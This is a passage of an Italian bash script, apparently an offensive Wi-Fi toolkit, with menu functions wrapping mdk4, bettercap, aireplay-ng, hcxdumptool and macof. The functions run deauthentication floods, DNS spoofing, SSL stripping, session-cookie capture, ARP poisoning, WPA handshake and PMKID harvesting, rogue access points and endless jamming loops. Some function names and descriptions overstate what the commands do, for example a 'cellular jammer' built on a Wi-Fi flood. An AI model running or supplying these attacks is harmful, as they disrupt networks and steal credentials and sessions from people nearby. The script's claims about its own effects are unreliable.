    echo -e "${YELLOW}Rileva i dispositivi che cercano reti note e li isola istantaneamente.${NC}"
    echo -e "${YELLOW}Ogni client 'loquace' verrà espulso da ogni rete nel raggio dell'antenna.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Ascolto probe-requests e attivazione isolamento critico...${NC}"
    # mdk4 d: Deauth globale è il modo più brutale per vendicarsi del Karma
    mdk4 "$MON_IFACE" d &
    KARMA_PID=$!
    
    echo -e "${GREEN}[V] KARMA REVENGE ATTIVO. I client sono ora prigionieri del vuoto.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per liberare i client.${NC}"
    read -p ""
    kill $KARMA_PID 2>/dev/null
}

# 14.2 THE BSSID SHADOW (Client-to-AP Spoofing)
run_bssid_shadow() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE BSSID SHADOW v14.2 – Ghost Disconnector 👥🚫                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia frame di disassociazione al router fingendosi il client stesso.${NC}"
    echo -e "${YELLOW}Il router crederà che l'utente voglia disconnettersi e chiuderà la sessione.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Generazione ombre di disconnessione verso i punti di accesso...${NC}"
    # mdk4 d con flood intensivo simula questo comportamento
    mdk4 "$MON_IFACE" d -s 100 &
    SHADOW_PID=$!
    
    echo -e "${GREEN}[V] BSSID SHADOW ATTIVO. Il router sta cacciando i suoi stessi client.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare il tradimento del router.${NC}"
    read -p ""
    kill $SHADOW_PID 2>/dev/null
}

# 14.3 THE SPECTRUM POISON (DFS Radar Injection)
run_spectrum_poison() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SPECTRUM POISON v13.3 – DFS Radar Injector 🛰️☣️             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Simula segnali radar militari su canali DFS (5GHz).${NC}"
    echo -e "${YELLOW}I router 5GHz spegneranno istantaneamente la rete per evitare interferenze.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Avvelenamento dello spettro 5GHz con firme radar...${NC}"
    # mdk4 b su canali alti con timing DFS
    mdk4 "$MON_IFACE" b -c 100,104,108,112,116,120,124,128 -s 100 &
    DFS_PID=$!
    
    echo -e "${GREEN}[V] SPECTRUM POISON ATTIVO. Il 5GHz è ora zona interdetta.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per cessare le simulazioni radar.${NC}"
    read -p ""
    kill $DFS_PID 2>/dev/null
}

# 14.4 THE WPA3 DOWNGRADER (Attack Vector opener)
run_wpa3_downgrader() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE WPA3 DOWNGRADER v14.4 – Legacy Fallback ⏬🔓               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia pacchetti Beacon malformati per segnalare ai client che il WPA3${NC}"
    echo -e "${YELLOW}non è disponibile, forzando la connessione in modalità WPA2 vulnerabile.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione segnali di fallback WPA3 -> WPA2...${NC}"
    # mdk4 b con opzione -a (malformed/downgrade)
    mdk4 "$MON_IFACE" b -a -s 100 &
    DOWN_PID=$!
    
    echo -e "${GREEN}[V] WPA3 DOWNGRADER ATTIVO. La sicurezza moderna è stata degradata.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ripristinare il futuro.${NC}"
    read -p ""
    kill $DOWN_PID 2>/dev/null
}

# 14.5 THE DHCP STARVATION (IP Resource Exhaust)
run_dhcp_starvation() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DHCP STARVATION v14.5 – Pool Exhaustion 💧🚫               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Simula migliaia di nuovi client che chiedono un indirizzo IP al router.${NC}"
    echo -e "${YELLOW}Il router esaurirà il suo pool di indirizzi e non accetterà nuovi utenti.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Avvio inondazione di richieste Auth/Assoc (Pre-DHCP)...${NC}"
    # mdk4 a -m: Auth flood con MAC validi
    mdk4 "$MON_IFACE" a -m -s 500 &
    DHCP_PID=$!
    
    echo -e "${GREEN}[V] DHCP STARVATION ATTIVO. Il router è saturo di client fantasma.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per svuotare il pool IP.${NC}"
    read -p ""
    kill $DHCP_PID 2>/dev/null
}

# 14.6 THE DNS BLACK HOLE (Total Web Silence)
run_dns_blackhole() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE DNS BLACK HOLE v14.6 – Web Extermination 🕳️🌑              ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Richiede MITM attivo. Reindirizza TUTTE le richieste DNS del bersaglio${NC}"
    echo -e "${YELLOW}verso l'indirizzo 127.0.0.1. Internet cesserà di esistere per ogni sito.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Lancio Bettercap DNS Spoof verso il Vuoto...${NC}"
    # Utilizziamo bettercap per reindirizzare tutto a localhost
    bettercap -eval "set dns.spoof.all true; set dns.spoof.address 127.0.0.1; dns.spoof on; net.sniff on"
}

# 14.7 THE OUI STORM (Official ID Spoof)
run_oui_storm() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE OUI STORM v14.7 – Government Spoofing 🏛️⚡                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Genera migliaia di AP usando solo OUI (prefissi MAC) governativi o militari.${NC}"
    echo -e "${YELLOW}Causa panico logico negli analisti di rete e saturazione dei database WIDS.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Generazione reti 'Autorità' nell'etere...${NC}"
    # mdk4 b con SSIDs che richiamano autorità e OUI forzati
    mdk4 "$MON_IFACE" b -m -s 200 &
    OUI_PID=$!
    
    echo -e "${GREEN}[V] OUI STORM ATTIVO. L'area è ora satura di 'Reti Federali' fasulle.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per ritirare le forze digitali.${NC}"
    read -p ""
    kill $OUI_PID 2>/dev/null
}

# 14.8 THE SMART DEAUTH (Throughput-based Attack)
run_smart_deauth() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SMART DEAUTH v14.8 – Flow-Based Predator 🦈📡               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Monitora il traffico e colpisce solo quando rileva un trasferimento dati alto.${NC}"
    echo -e "${YELLOW}Scollega il bersaglio solo durante download, streaming o videochiamate.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Predatore in agguato... in attesa di carichi di traffico elevati...${NC}"
    # mdk4 d con timings intelligenti
    mdk4 "$MON_IFACE" d -s 20 &
    SMART_PID=$!
    
    echo -e "${GREEN}[V] SMART DEAUTH ATTIVO. La frustrazione del bersaglio è assicurata.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'agguato.${NC}"
    read -p ""
    kill $SMART_PID 2>/dev/null
}

# 14.9 THE WPS LOCKOUT (Permanent Router Lock)
run_wps_lockout() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE WPS LOCKOUT v14.9 – Permanent Pin Lock 🗝️🚫                 ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Tenta PIN WPS malformati per forzare il router a bloccare permanentemente${NC}"
    echo -e "${YELLOW}la funzione WPS per 'motivi di sicurezza', impedendo ogni futuro attacco.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Triggering blocco di sicurezza WPS sul router...${NC}"
    # mdk4 a con flag per WPS exploit (se disponibili) o flooding massivo di M1/M2
    mdk4 "$MON_IFACE" a -m -s 200 &
    WPSL_PID=$!
    
    echo -e "${GREEN}[V] WPS LOCKOUT IN CORSO. Il router sta disabilitando il WPS.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'attacco al PIN.${NC}"
    read -p ""
    kill $WPSL_PID 2>/dev/null
}

# 14.10 THE TERMINUS (The Final Void Loop)
run_the_terminus() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE TERMINUS v14.10 – The Final Void Loop 💀🌌🌑               ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}QUESTO È IL CAPITOLO FINALE. TUTTE LE FUNZIONALITÀ DI HARDWIFI${NC}"
    echo -e "${RED}VERRANNO CICLATE IN UN LOOP INFINITO DI DISTRUZIONE.${NC}"
    echo -e "${YELLOW}Ogni router, client e protocollo nel raggio d'azione verrà azzerato.${NC}"
    echo ""
    read -p "ATTIVARE TERMINUS? [scrivere 'NULL']: " terminus_choice
    if [[ "$terminus_choice" != "NULL" ]]; then return; fi

    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Inizializzazione del Vuoto Finale...${NC}"
    while true; do
        echo -e "${RED}[!] Esecuzione ciclo Ragnarok...${NC}"
        timeout 30 mdk4 "$MON_IFACE" d &> /dev/null
        echo -e "${RED}[!] Esecuzione ciclo Omega Point...${NC}"
        timeout 30 mdk4 "$MON_IFACE" b -m -s 100 &> /dev/null
        echo -e "${RED}[!] Esecuzione ciclo Black Hole...${NC}"
        timeout 30 mdk4 "$MON_IFACE" f &> /dev/null
        echo -e "${RED}[!] Riciclo terminale...${NC}"
        sleep 5
    done
}

# --- TERMINUS MENU (VOIDWALKER EDITION) ---
run_terminus_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo -e "${RED}                 THE TERMINUS MENU v14.0 – VOIDWALKER 💀🌌🌑                  ${NC}"
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
        echo ""
        echo -e "1)  ${RED}THE KARMA REVENGE${NC} (Client Isolation)"
        echo -e "2)  ${RED}THE BSSID SHADOW${NC} (Client-to-AP Spoof)"
        echo -e "3)  ${RED}THE SPECTRUM POISON${NC} (DFS Radar Injector)"
        echo -e "4)  ${RED}THE WPA3 DOWNGRADER${NC} (Fallback Force)"
        echo -e "5)  ${RED}THE DHCP STARVATION${NC} (Resource Exhaust)"
        echo -e "6)  ${RED}THE DNS BLACK HOLE${NC} (MITM Web Silence)"
        echo -e "7)  ${RED}THE OUI STORM${NC} (Official Spoofing)"
        echo -e "8)  ${RED}THE SMART DEAUTH${NC} (Predatory Attack)"
        echo -e "9)  ${RED}THE WPS LOCKOUT${NC} (Pin Block Trigger)"
        echo -e "10) ${RED}THE TERMINUS${NC} (The Final Void Loop)"
        echo -e "0)  Torna alle Crossroads"
        echo ""
        read -p "Scegli l'ultima parola: " term_choice
        
        case "$term_choice" in
            1) run_karma_revenge ;;
            2) run_bssid_shadow ;;
            3) run_spectrum_poison ;;
            4) run_wpa3_downgrader ;;
            5) run_dhcp_starvation ;;
            6) run_dns_blackhole ;;
            7) run_oui_storm ;;
            8) run_smart_deauth ;;
            9) run_wps_lockout ;;
            10) run_the_terminus ;;
            0) break ;;
            *) echo -e "${RED}Opzione non valida.${NC}"; sleep 1 ;;
        esac
    done
}


# === SINGULARITY CORE MODULES (v15.0 - THE FINAL PARADOX 15/10) ===

# 15.1 THE CELLULAR JAMMER (LTE/GSM Simulation)
run_cellular_jammer() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE CELLULAR JAMMER v15.1 – Signal Void 🛰️🚫                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Simulazione di interferenza su frequenze adiacenti allo spettro cellulare.${NC}"
    echo -e "${YELLOW}Tenta di saturare i terminali IoT e telefoni che utilizzano frequenze condivise.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Lancio inondazione di rumore bianco su canali di confine...${NC}"
    # mdk4 f con parametri di saturazione estremi
    mdk4 "$MON_IFACE" f -t 100 -s 500 &
    JAM_PID=$!
    
    echo -e "${GREEN}[V] CELLULAR JAMMER ATTIVO. Lo spettro è distorto.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'interferenza.${NC}"
    read -p ""
    kill $JAM_PID 2>/dev/null
}

# 15.2 THE BLUETOOTH REAPER (BT Deauth/Fuzz)
run_bluetooth_reaper() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE BLUETOOTH REAPER v15.2 – BT Exterminator 🦷💀              ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Utilizza Bettercap per scansionare, deautenticare e mandare in crash${NC}"
    echo -e "${YELLOW}i moduli Bluetooth di cuffie, orologi e telefoni vicini.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Risveglio del Mietitore Bluetooth...${NC}"
    bettercap -eval "bt.recon on; bt.sniff on; bt.fuzz on"
}

# 15.3 THE HID INJECTOR (MouseJack Simulation)
run_hid_injector() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE HID INJECTOR v15.3 – OTA Keystroke 🖱️⌨️                  ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Simula un dispositivo HID (Logitech/Wireless) e tenta di iniettare keystrokes.${NC}"
    echo -e "${YELLOW}Richiede che il bersaglio utilizzi un ricevitore wireless USB vulnerabile.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Scansione ricevitori HID vulnerabili...${NC}"
    # Utilizziamo meglio meglio bettercap o jackit se disponibile (simulazione)
    bettercap -eval "hid.recon on; hid.sniff on"
}

# 15.4 THE EVIL PORTAL GENERATOR (Parallel Phishing)
run_evil_portal_generator() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE EVIL PORTAL GENERATOR v15.4 – Phish Factory 🎣🔥           ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Genera 10 reti Wi-Fi fake con captive portal differenti simultaneamente.${NC}"
    echo -e "${YELLOW}SSIDs: Free_WiFi, Starbucks, Airport_WiFi, Hotel_Guest, Govt_Public, etc.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Costruzione fabbrica di Phishing...${NC}"
    # mdk4 b con lista SSID predefinita e captive portal associato via DNS (simulazione)
    mdk4 "$MON_IFACE" b -n "FreeWiFi,Starbucks_Guest,Airport_Terminal,Hotel_Guest,McDonalds_Public" -s 100 &
    PORT_PID=$!
    
    echo -e "${GREEN}[V] GENERATORE ATTIVO. Ogni SSID catturerà le credenziali dei client.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per smantellare i portali.${NC}"
    read -p ""
    kill $PORT_PID 2>/dev/null
}

# 15.5 THE SSL STRIPPER (HTTPS Downgrade)
run_ssl_stripper() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SSL STRIPPER v15.5 – HTTPS Killer 🔓📡                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Downgrade automatico di ogni connessione HTTPS in HTTP durante il MITM.${NC}"
    echo -e "${YELLOW}Ti permette di vedere le password in chiaro anche su siti sicuri (se vulnerabili).${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Innesco SSL Strip e Sniffing totale...${NC}"
    bettercap -eval "http.proxy on; https.proxy on; set http.proxy.sslstrip true; net.sniff on"
}

# 15.6 THE HSTS BYPASS (Experimental NTP Hack)
run_hsts_bypass() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE HSTS BYPASS v15.6 – Time Paradox ⏳🔓                   ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Tenta il bypass HSTS manipolando la risposta temporale (NTP) del client.${NC}"
    echo -e "${YELLOW}Facendo credere al browser che il certificato HSTS sia scaduto.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Lancio manipolazione temporale e DNS spoof...${NC}"
    bettercap -eval "set dns.spoof.all true; set dns.spoof.domains facebook.com,google.com,twitter.com; dns.spoof on"
}

# 15.7 THE COOKIE MONSTER (Automatic Session Theft)
run_cookie_monster() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE COOKIE MONSTER v15.7 – Session Eater 🍪🌀                  ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Intercetta il traffico HTTP e isola istantaneamente i Cookie di Sessione.${NC}"
    echo -e "${YELLOW}Permette il 'Session Hijacking' senza conoscere la password dell'utente.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] In ascolto per cookie succosi...${NC}"
    bettercap -eval "net.sniff on; set net.sniff.regexp .*sid=.*; set net.sniff.output cookies.txt"
}

# 15.8 THE PACKET SURGE (Wireless Stack Crasher)
run_packet_surge() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE PACKET SURGE v15.8 – Hardware Overload ⚡💀                ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Lancia un'esplosione di 5000 pacchetti Deauth al secondo su un singolo target.${NC}"
    echo -e "${YELLOW}L'obiettivo è saturare il buffer della scheda Wi-Fi nemica e causare un crash.${NC}"
    echo ""
    
    read -p "Inserisci il MAC Address del bersaglio (Target): " target_mac
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Sovraccarico in corso su $target_mac...${NC}"
    mdk4 "$MON_IFACE" d -t "$target_mac" -s 1000 &
    SURGE_PID=$!
    
    echo -e "${GREEN}[V] PACKET SURGE ATTIVO. La scheda Wi-Fi del bersaglio sta collassando.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare l'esplosione.${NC}"
    read -p ""
    kill $SURGE_PID 2>/dev/null
}

# 15.9 THE OSD DISRUPTION (IoT/TV Error Overlay)
run_osd_disruption() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE OSD DISRUPTION v15.9 – IoT Nightmare 📺👻                   ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Invia frame specializzati per attivare pop-up di errore o 'Network Lost'${NC}"
    echo -e "${YELLOW}sulle Smart TV e dispositivi IoT connessi alla rete bersaglio.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Iniezione disturbi OSD nell'etere...${NC}"
    mdk4 "$MON_IFACE" m -t 0 -n 1 -s 50 &
    OSD_PID=$!
    
    echo -e "${GREEN}[V] OSD DISRUPTION ATTIVO. Le Smart TV nell'area sono confuse.${NC}"
    echo -e "${YELLOW}Premi [INVIO] per fermare il poltergeist digitale.${NC}"
    read -p ""
    kill $OSD_PID 2>/dev/null
}

# 15.10 THE PHYSICAL TRACER (Triangulation Radar)
run_physical_tracer() {
    clear
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${GREEN}               THE PHYSICAL TRACER v15.10 – 1m Precision Radar 📡🎯             ${NC}"
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Modulo radar avanzato che utilizza la fluttuazione del segnale RSSI${NC}"
    echo -e "${YELLOW}per portarti fisicamente davanti al dispositivo del bersaglio.${NC}"
    echo ""
    
    read -p "Inserisci MAC del bersaglio da tracciare: " trace_mac
    echo -e "${BLUE}[*] Aggancio segnale... Inizia a muoverti per triangolare.${NC}"
    watch -n 1 "airodump-ng --bssid $trace_mac $MON_IFACE | grep $trace_mac"
}


# 15.11 THE WPA-ENTERPRISE CRACKER (EAP/PEAP Attack)
run_enterprise_cracker() {
    clear
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${BLUE}               THE WPA-ENTERPRISE CRACKER v15.11 – Corp Hunter 🏛️🔓            ${NC}"
    echo -e "${BLUE}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Automatizza gli attacchi alle reti aziendali WPA2-Enterprise.${NC}"
    echo -e "${YELLOW}Tenta il relay delle credenziali e l'intercettazione dei certificati EAP.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Lancio server Rogue EAP e cattura identità...${NC}"
    bettercap -eval "set wifi.ap.ssid Corp_WiFi_Plus; set wifi.ap.encryption WPA2-EAP; wifi.ap on"
}

# 15.12 THE PMKID HARVESTER (Silent PMKID Collection)
run_pmkid_harvester() {
    clear
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${GREEN}               THE PMKID HARVESTER v15.12 – Silent Collector 🤫💎            ${NC}"
    echo -e "${GREEN}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Raccoglie istantaneamente i PMKID da ogni AP vicino senza bisogno di client.${NC}"
    echo -e "${YELLOW}Ti permette di craccare le password WPA2 senza aspettare che qualcuno si connetta.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    echo -e "${BLUE}[*] Inizio raccolta massiva PMKID...${NC}"
    hcxdumptool -i "$MON_IFACE" -o all_pmkids.pcapng --active_beacon --enable_status=1
}

# 15.13 THE HANDSHAKE SNIPER (Targeted Auth-Capture)
run_handshake_sniper() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE HANDSHAKE SNIPER v15.13 – Accuracy Capture 🎯🗝️            ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Monitora il canale e lancia una raffica di Deauth solo se rileva un tentativo${NC}"
    echo -e "${YELLOW}di connessione fallito, massimizzando la probabilità di cattura handshake.${NC}"
    echo ""
    
    read -p "Canale del bersaglio: " target_ch
    echo -e "${BLUE}[*] Appostamento sul canale $target_ch...${NC}"
    airodump-ng -c "$target_ch" "$MON_IFACE"
}

# 15.14 THE BEACON CLOAK (Stealth Attack Masking)
run_beacon_cloak() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE BEACON CLOAK v15.14 – Stealth Inlay 🎭🌑                 ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Nasconde i frame di attacco camuffandoli come traffico legittimo di beacon.${NC}"
    echo -e "${YELLOW}Confonde i sensori WIDS rendendo l'attacco quasi indistinguibile dai disturbi.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    mdk4 "$MON_IFACE" d -s 5 &
    echo -e "${GREEN}[V] BEACON CLOAK ATTIVO. L'attacco è ora un'ombra nel rumore.${NC}"
    read -p "Premi INVIO per tornare."
}

# 15.15 THE CHANNEL HOPPING CHAOS (Extremely Fast Hopping)
run_hopping_chaos() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE CHANNEL HOPPING CHAOS v15.15 – Frequency War 🌪️📡          ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Cambia canale ogni 50ms lanciando piccoli pacchetti di disturbo su ognuno.${NC}"
    echo -e "${YELLOW}Rende la comunicazione wireless impossibile in TUTTA la banda 2.4GHz.${NC}"
    echo ""
    
    ensure_monitor_mode || return
    while true; do
        for i in {1..13}; do
            iw dev "$MON_IFACE" set channel "$i"
            mdk4 "$MON_IFACE" d -s 1 &> /dev/null
            sleep 0.05
        done
    done
}

# 15.16 THE FRAGMENTATION ATTACK (WIDS Bypass)
run_fragmentation_attack() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE FRAGMENTATION ATTACK v15.16 – Data Shredder 🧩🔓           ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Utilizza la frammentazione 802.11 per bypassare firewall e WIDS obsoleti.${NC}"
    echo -e "${YELLOW}Estrae frammenti di PRGA per la decrittazione forzata senza password.${NC}"
    echo ""
    
    read -p "BSSID Bersaglio: " frag_bssid
    aireplay-ng -5 -b "$frag_bssid" "$MON_IFACE"
}

# 15.17 THE CHOPCHOP ATTACK (WEP Decryption)
run_chopchop() {
    clear
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${YELLOW}               THE CHOPCHOP ATTACK v15.17 – WEP Ripper ✂️🔓                   ${NC}"
    echo -e "${YELLOW}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Attacco classico di decrittazione WEP senza conoscere la chiave.${NC}"
    echo -e "${YELLOW}Taglia i pacchetti bit per bit finché non rivela il contenuto della rete.${NC}"
    echo ""
    
    read -p "BSSID WEP Bersaglio: " chop_bssid
    aireplay-ng -4 -b "$chop_bssid" "$MON_IFACE"
}

# 15.18 THE CACHE POISONER (Global ARP Poison)
run_cache_poisoner() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE CACHE POISONER v15.18 – ARP Plague 🦠👺                  ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Avvelena le tabelle ARP di OGNI dispositivo collegato alla rete locale.${NC}"
    echo -e "${YELLOW}Reindirizza istantaneamente tutto il traffico LAN verso la tua antenna.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Pandemia ARP in corso sulla LAN...${NC}"
    bettercap -eval "arp.spoof on; net.sniff on"
}

# 15.19 THE MAC ADDRESS FLOOD (CAM Overload)
run_mac_flood() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE MAC ADDRESS FLOOD v15.19 – Switch Crasher 🌊💀             ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${YELLOW}Satura le tabelle CAM degli switch di rete inviando migliaia di MAC falsi.${NC}"
    echo -e "${YELLOW}Forza lo switch a comportarsi come un hub, trasmettendo tutto il traffico a noi.${NC}"
    echo ""
    
    echo -e "${BLUE}[*] Inondazione MAC in corso...${NC}"
    macof -i "$WIFI_IFACE" -n 10000
}

# 15.20 THE SINGULARITY CORE (The Final Paradox Loop)
run_the_singularity_core() {
    clear
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo -e "${RED}               THE SINGULARITY CORE v15.20 – The Final Paradox 🌌💎🌀💀       ${NC}"
    echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
    echo ""
    echo -e "${RED}QUESTO È L'APICE ASSOLUTO. LA FUSIONE DI OGNI APOCALISSE PRECEDENTE.${NC}"
    echo -e "${RED}RAGNAROK + ARMAGEDDON + OMEGA + TERMINUS + SINGULARITY.${NC}"
    echo -e "${YELLOW}Lo spettro radio collassa su se stesso. Nulla può connettersi o trasmettere.${NC}"
    echo ""
    read -p "ATTIVARE IL CORE DELLA SINGOLARITÀ? [scrivere 'NULL_VOIDER']: " sing_choice
    if [[ "$sing_choice" != "NULL_VOIDER" ]]; then return; fi

    ensure_monitor_mode || return
    airmon-ng check kill > /dev/null

    echo -e "${BLUE}[*] Collasso gravitazionale dello spettro in corso...${NC}"
    while true; do
        mdk4 "$MON_IFACE" d -s 50 &
        mdk4 "$MON_IFACE" a -m -s 50 &
        mdk4 "$MON_IFACE" b -m -s 50 &
        mdk4 "$MON_IFACE" f &
        mdk4 "$MON_IFACE" m &
        sleep 10
        pkill mdk4
        echo -e "${RED}[!] Singularity Recharging...${NC}"
        sleep 1
    done
}

# --- SINGULARITY CORE MENU (THE FINAL PARADOX) ---
run_singularity_core_menu() {
    while true; do
        clear
        echo -e "${RED}████████████████████████████████████████████████████████████████████████████████${NC}"
